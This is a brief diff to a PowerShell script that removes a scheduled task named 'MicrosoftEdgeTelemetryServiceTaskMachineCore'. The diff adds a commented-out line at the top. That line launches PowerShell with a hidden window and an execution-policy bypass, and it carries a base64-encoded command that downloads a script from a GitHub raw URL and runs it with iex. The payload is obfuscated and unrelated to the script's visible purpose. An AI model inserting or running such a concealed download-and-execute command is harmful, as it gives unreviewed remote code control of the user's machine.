@@ -1,3 +1,5 @@
+# powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYQAvAG0AYQBzAHQAZQByAC8AYwBvAG0AcABsAGUAdABlAHwAaQBlAHgA
+
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
 }
